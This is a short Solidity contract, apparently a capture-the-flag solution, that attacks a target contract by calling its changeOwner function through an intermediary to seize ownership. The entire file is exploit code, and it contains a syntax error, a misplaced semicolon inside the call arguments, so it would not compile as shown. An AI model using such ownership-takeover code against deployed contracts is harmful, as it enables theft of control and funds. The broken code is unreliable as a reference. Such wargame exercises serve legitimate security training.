// SPDX-License-Identifier: MIT
pragma solidity >= 0.4.22 < 0.9.0;

contract TelephoneAttack {
    address target;

    constructor(address _target){
        target = _target;
    }

    function attack() public{

        (bool success,) = target.call(
            abi.encodeWithSignature("changeOwner(address)", msg.sender);
        );
        require(success);

    }


}